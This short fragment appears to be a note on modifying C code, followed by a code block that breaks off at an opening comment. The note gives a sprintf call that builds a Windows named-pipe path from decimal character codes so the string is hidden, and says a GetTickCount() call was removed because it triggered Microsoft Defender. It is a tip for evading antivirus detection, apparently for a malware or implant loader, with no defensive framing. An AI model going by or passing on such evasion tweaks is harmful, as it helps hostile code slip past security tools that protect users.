- in `sprintf(pipename, "%c%c%c%c%c%c%c%c%cnotrt-svc\\noptev", 92, 92, 46, 92, 112, 105, 112, 101, 92);` the original `GetTickCount()` was flagging defender, took it out and works fine
```c
/*
